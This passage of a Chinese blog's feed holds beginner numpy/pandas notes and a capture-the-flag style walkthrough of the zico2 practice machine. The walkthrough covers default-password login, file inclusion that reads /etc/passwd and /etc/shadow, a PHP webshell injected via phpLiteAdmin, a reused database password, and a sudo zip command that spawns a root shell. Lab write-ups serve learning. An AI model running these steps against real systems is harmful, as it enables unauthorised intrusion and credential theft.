align="center">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="center">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;考试可能会用到 谁又知道呢&lt;/p&gt;
&lt;h1 id=&quot;一、osi模型&quot;&gt;&lt;a href=&quot;#一、osi模型&quot; class=&quot;headerlink&quot; title=&quot;一、osi模型&quot;&gt;&lt;/a&gt;一、osi模型&lt;/h1&gt;&lt;p&gt;维基百科定义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; “OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>数据分析相关</title>
    <link href="https://www.maonie.top/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/"/>
    <id>https://www.maonie.top/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/</id>
    <published>2024-04-27T11:36:28.000Z</published>
    <updated>2024-04-27T12:37:30.974Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="数据分析是干啥的"><a href="#数据分析是干啥的" class="headerlink" title="数据分析是干啥的"></a>数据分析是干啥的</h2><p>-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化<br>–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度<br>–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等</p><p>例：<br>1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能<br>2.支付宝通过用户消费记录和行为自动调整花呗额度<br>3.短视频通过用户的点击和观看行为给用户推送合适的视频</p><h2 id="我为啥要学数据分析"><a href="#我为啥要学数据分析" class="headerlink" title="我为啥要学数据分析"></a>我为啥要学数据分析</h2><p><del>因为我现在就得用</del><br>可以用于某些岗位或竞赛<br>python数据科学的基础<br>机器学习课程的基础</p><h2 id="数据分析的流程"><a href="#数据分析的流程" class="headerlink" title="数据分析的流程"></a>数据分析的流程</h2><span id="more"></span><p>提出问题<br>准备数据<br>分析数据<br>获得结论<br>成果可视化</p><h2 id="要用的工具"><a href="#要用的工具" class="headerlink" title="要用的工具"></a>要用的工具</h2><p>-numpy<br>-pandas<br>-matplotlib</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>-anaconda|全球最受欢迎的数据啥啥啥|集成了数据分析和机器学习需要的全部环境<br>注意：安装目录不能有中文和特殊符号<br>-jupyter|anaconda提供的基于浏览器的<strong>可视化开发工具</strong><br>启动方式：cmd-jupyter notebook-回车<br>新建方式：图形化页面-new-文件或者文件夹<br>            python3：anaconda中的源文件<br>            cell:可以在里面执行相关代码 code模式是代码 markdown模式是笔记<br>            可以在编辑页面更换<br>快捷键：添加cell-a或者b<br>        删除-x<br>        修改cell的模式-m：修改成markdown<br>                         y：修改成code模式<br>        执行cell-shift+enter<br>        tab：自动补全<br>        代开帮助文档：shift+tab</p><h2 id="numpy模块的使用"><a href="#numpy模块的使用" class="headerlink" title="numpy模块的使用"></a>numpy模块的使用</h2><p>创建numpy</p><h3 id="1-1创建一个一维数组"><a href="#1-1创建一个一维数组" class="headerlink" title="1.1创建一个一维数组"></a><strong>1.1创建一个一维数组</strong></h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">import numpy as nparr = np.array([1,2,3])arr #cell中输出的时候直接打元素名就行 不用echo输出：array([1,2,3])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2创建一个多维数组"><a href="#1-2创建一个多维数组" class="headerlink" title="1.2创建一个多维数组"></a><strong>1.2创建一个多维数组</strong></h3><pre class="line-numbers language-none"><code class="language-none">arr = np.array([1,2,3],[4,5,6])arr输出：array([1,2,3],  [4,5,6])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组和列表的区别是什么呢？<br>-数组中存储的数据元素类型都是统一的<br>-优先级：字符串&gt;浮点型&gt;整数</p><pre class="line-numbers language-none"><code class="language-none">例如：arr = np.array([1,2.2,3])arr输出：array([1.,2.2,3.])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1将外部的一张图片读取并加载到numpy数组中"><a href="#2-1将外部的一张图片读取并加载到numpy数组中" class="headerlink" title="2.1将外部的一张图片读取并加载到numpy数组中"></a>2.1将外部的一张图片读取并加载到numpy数组中</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">import matplotlib.pyplot as pltimg_arr = plt.imread('./1.jpg') #返回的数组，数组中装载的就是图片内容plt.imshow(img_arr) #将numpy数组进行可视化展示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出结果即为1.jpg的图像内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">img_arr = img_arr - 100 #将每一个数组元素都减去100plt.imshow(img_arr)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出结果是色调有差别的图像内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">np.ones(shape=(3,4)) #输出结果是一个三行 四列的数组np.linspace(0,100,num=20) #项数为20的一维等差数列数组np.arange(10,50,step=2) #返回了10开头 50结尾 公差为2的一维数组np.random.randint(0,100,size=(5,6)) #生成一个五行六列的数组 内容为随机数数组名.shape #输出为数组的形状(行数，列数)数组名.ndim #返回的是数组的维度(数组里包了几个数组)数组名.size #返回数组元素的个数数组名.dtype #返回数组元素的类型创建数组的时候输入dtype参数来指定元素类型或者通过 数组名.dtype = “指定类型” 来修改type(数组名) #返回数组的数据类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-1numpy的索引和切片操作"><a href="#3-1numpy的索引和切片操作" class="headerlink" title="3.1numpy的索引和切片操作"></a>3.1numpy的索引和切片操作</h2><p>索引和列表同理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">创建一个数组之后 我们可以取出数组的指定数据数组名[1,4] #取出数组中下标为1,4的数据数组名[0：2] #切出数组前两行的数据数组名[:,0:2] #切出数组前两列的数据数组名[0:2,0:2] #切出数组前两行前两列的数据数组名[::-1] #将数组的行倒置数组名[:,::-1]  #将数组的列倒置数组名[::-1,::-1] #整个倒置左右反转图片img_arr = plt.imread('./1.jpg') #返回的数组，数组中装载的就是图片内容plt.imshow(img_arr[:,::-1,:]) #三个数值分别代表行 列 颜色上下反转图片plt.imshow(img_arr[::-1,:,:]) #三个数值分别代表行 列 颜色图片裁剪功能plt.imshow(img_arr[66:200,78:300,:]) #三个数值分别代表行 列 颜色变形（reshape）数组名.reshape((30,)) #把二维的数组变形成一维数组名.reshape((2,15)) #将一维变形成多维数组名.reshape((6,5)) #将一维变形成多维级联操作-将多个numpy数组进行横向纵向的拼接axis轴向0为列 纵向拼接 1为行 横向拼接（行与列无法对应会报错哦）np.consatenate((数列1,数列2),axis=1)图片的拼接np.consatenate((数列1,数列2,数列3),axis=1)plt.imshow(img_arr) #三个数值分别代表行 列 颜色常用聚合操作-sum,max,min,mean计算和 最大值 最小值 求均值-sin,cos,tan三角函数around(a,decimals)a:数组名 decimals:舍入的小数位数numpy.amin()和numpy.amax(),用于计算数组中的元素沿指定轴的最小、最大值。numpy.ptp(),计算数组中元素最大值与最小值的差numpy.median(),计算数组中元素的中位数std() var()输出标准差与方差 方差就是标准差的平方使用例:数组名[1].std() #输出第一行的标准差还有数学里的矩阵相加 相减 相乘 eye() #返回一个标准的单位矩阵.T #转置矩阵（行变成列 列变成行）np.dot(数列1,数列2) #两个数列相乘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="panda基础操作"><a href="#panda基础操作" class="headerlink" title="panda基础操作"></a>panda基础操作</h2><p>numpy是用来处理数值型的数据 还有很多其他类型的数据(字符串，时间序列)<br>那么什么是pandas捏？<br>首先来认识pandas中的两个常用的类<br>    -Series<br>    -DataFrame<br>Series是一种类似于一维数组的对象，由下面两个部分组成:<br>    values:一组数据<br>    index:相关的数据索引标签<br>Series的创建<br>    -由列表或numpy数组创建。<br>    -由字典创建</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pandas import Seriess = Series(data=[1,2,3,'four'])s#输出结果类似于卡西欧(是的就是计算器)的数组表现形式0112233fourdtype:objectimport numpy as npSeries(data=np.random.randint(0,100,size=(3,1)))#必须是一维数组 不然会报错03143282dtype:int64from pandas import Series#index用来指定显示索引s = Series(data=[1,2,3,'four'],index=['a','b','c','d'])sa1b2c3dfourdtype:object#显示索引可以增强Series的可读性dic = {'语文':100,'数学':99,'理综':250,}s = Series(data=dic)s语文100数学99理综250dtype:int64s.[0]100s.语文100s[0:2]语文100数学99dtype:int64s.shape #返回Series的形状s.size #返回Series元素的个数s.index #返回Series的索引 s.values #返回Series的值s.dtype #返回元素类型 o代表object(字符串)s.head(n) #前n个数据 s.tail(n) #后n个元素s.unique #去重s.isnull #判断元素是否为空 空返回Ture 反之Falses.notnull #反之Series的算术运算直接 a = 数组1+数组2即可index一致的元素会进行算数运算 否则算空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>————————————————————————————————————————<br>那么接下来是DataFrame 他是一个表格型的数据库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pandas import DataFramedf = DataFrame(data=[1,2,3],[4,5,6])df#输出结果  0 1 2————————0 1 2 31 4 5 6df = DataFrame(data=np.random.randint(0,100,size=(6,4)))df#输出结果为一个六行四列 内容为0-100随机数的表格dic = {    'name':['zhangsan','lisi','wanglaowu'],'salary':[1000,2000,3000]}df = DataFrame(data=dic,index=['a','b','c'])df#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000c   wanglaowu   3000#DataFrame的属性values、columns、index、shapedf.values #返回二维numpy数df.columns #返回列索引df.index #返回行索引df.shape #返回形状df.dtype #报错 因为DataFrame可以装不同类型的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>df的索引＆切片</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df = DataFrame(data=dic,index=['a','b','c'])df#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000c   wanglaowu   3000df['name'] #显示列时输入索引名即可#输出结果为        name  —————————————a    zhangsan  b        lisi c   wanglaowu  显示多列时加逗号与另一个引号df.loc[a]df.iloc[[a,b]] #显示行 iloc指隐式索引 loc指显示索引#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000df.iloc[a,b] #显示第a行 第b列的单个元素切片df[0:2] #切行df.iloc[:,0:2] #切列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;数据分析是干啥的&quot;&gt;&lt;a href=&quot;#数据分析是干啥的&quot; class=&quot;headerlink&quot; title=&quot;数据分析是干啥的&quot;&gt;&lt;/a&gt;数据分析是干啥的&lt;/h2&gt;&lt;p&gt;-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化&lt;br&gt;–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度&lt;br&gt;–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等&lt;/p&gt;
&lt;p&gt;例：&lt;br&gt;1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能&lt;br&gt;2.支付宝通过用户消费记录和行为自动调整花呗额度&lt;br&gt;3.短视频通过用户的点击和观看行为给用户推送合适的视频&lt;/p&gt;
&lt;h2 id=&quot;我为啥要学数据分析&quot;&gt;&lt;a href=&quot;#我为啥要学数据分析&quot; class=&quot;headerlink&quot; title=&quot;我为啥要学数据分析&quot;&gt;&lt;/a&gt;我为啥要学数据分析&lt;/h2&gt;&lt;p&gt;&lt;del&gt;因为我现在就得用&lt;/del&gt;&lt;br&gt;可以用于某些岗位或竞赛&lt;br&gt;python数据科学的基础&lt;br&gt;机器学习课程的基础&lt;/p&gt;
&lt;h2 id=&quot;数据分析的流程&quot;&gt;&lt;a href=&quot;#数据分析的流程&quot; class=&quot;headerlink&quot; title=&quot;数据分析的流程&quot;&gt;&lt;/a&gt;数据分析的流程&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>zico2解析</title>
    <link href="https://www.maonie.top/2024/03/28/zico2%E8%A7%A3%E6%9E%90/"/>
    <id>https://www.maonie.top/2024/03/28/zico2%E8%A7%A3%E6%9E%90/</id>
    <published>2024-03-28T02:30:05.000Z</published>
    <updated>2024-03-28T05:19:50.895Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：zico2</p><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>Poc Exp 和payload 的关系<br>dirb （网站目录扫描）<br>文件包含漏洞<br>mysql相关（虽然是图形化页面）<br>一句话木马+蚁剑<br>zip提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>先把俩机子开开<span id="more"></span><br>扫一下同网段设备<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>看到靶机开放了 22 80 56444等端口<br>我们访问http服务 没发现什么 用dirb扫描看一下<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>存在/dbadmin/目录 进入之后是个登陆页面 写着phpLiteAdmin v1.9.3<br> <img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>那就用searchsploit来寻找可行的漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>找到四个 我们用searchsploit -m 下载第三个漏洞文件到本地<br>下载后查看发现该文件中写着POC 也就是Proof of Concept 这是什么意思呢<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/6.jpg" alt="6"></p><blockquote><p>POC和EXP</p><p>POC = Proof of Concept中文意思是“观点证明”。这个短语并非仅仅在漏洞报告中使用，甲方在项目招标过程中也常常要求乙方提供POC，即证明你的方案或者产品能达到声称的功能或性能，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p><p>EXP = Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p><p>如下视图所示：<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/5.png" alt="5"></p><p>POC，是用来验证漏洞是否存在的一段代码。<br>EXP，指利用系统漏洞进行渗透。<br>先有POC，后有EXP。<br>Payload：中文为’有效载荷’，指成功EXP之后，真正在目标系统执行的代码或者指令<br>Shellcode：中文为’shell代码’，是Payload的一种，由于其建立正向/反向shell而得名 （正向/反向：主动/被动链接）</p></blockquote><p>绕过这个页面一般用burpsuite爆破<br>输入密码admin我们成功进入了页面<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>里边有一个没删的表 <code>info</code> 进去可以发现用户名root和zico与对应的密码md5加密 只要通过解密网站即可获取明文<br>主页面还有一个小按钮 按了之后发现连接中有文件包含漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们使用验证文件包含漏洞的方式 在传参中输入若干的 <code>../</code>(返回上个目录)<br>然后输入<code>/etc/passwd</code> <code>/etc/shadow</code> 若正常显示内容则表示漏洞存在<br>前者显示所有账号信息 后者显示所有用户名和密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>这里再回到之前调用的漏洞 其中说明了步骤</p><pre class="line-numbers language-none"><code class="language-none">1.创建一个database 名称为hack.php2.在其中创建一个名为123的表 插入数据&lt;?php phpinfo()?&gt; 类型为TEXT3.(使用文件包含漏洞即可)想办法运行hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>搞完之后放在文件包含漏洞里测试效果<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br>这个页面就ok了<br>然后就都想得到嘛 用一句话代码 通过蚁剑连接<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>右键进入虚拟终端 在/home/zico/wordpress中查看wp-config.php的内容<br>发现一套密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/14.jpg" alt="14"></p><pre class="line-numbers language-none"><code class="language-none">/** MySQL database username */define('DB_USER', 'zico');/** MySQL database password */define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>账号为zico 密码为sWfCsfJSPV9H3AmQzw8<br>用这套密码和ssh登陆操作系统<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>登陆成功 使用sudo -l查看拥有sudo权限的命令 进行zip提权即可</p><pre class="line-numbers language-none"><code class="language-none">sudo zip 1.zip to_do.txt -T --unzip-command="sh -c /bin/bash"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/16.jpg" alt="16"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个集合了各方之长的靶机 流程很长<br>那我们下次再见！</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：zico2&lt;/p&gt;
&lt;h1 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h1&gt;&lt;p&gt;Poc Exp 和payload 的关系&lt;br&gt;dirb （网站目录扫描）&lt;br&gt;文件包含漏洞&lt;br&gt;mysql相关（虽然是图形化页面）&lt;br&gt;一句话木马+蚁剑&lt;br&gt;zip提权&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;p&gt;先把俩机子开开</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
</feed>
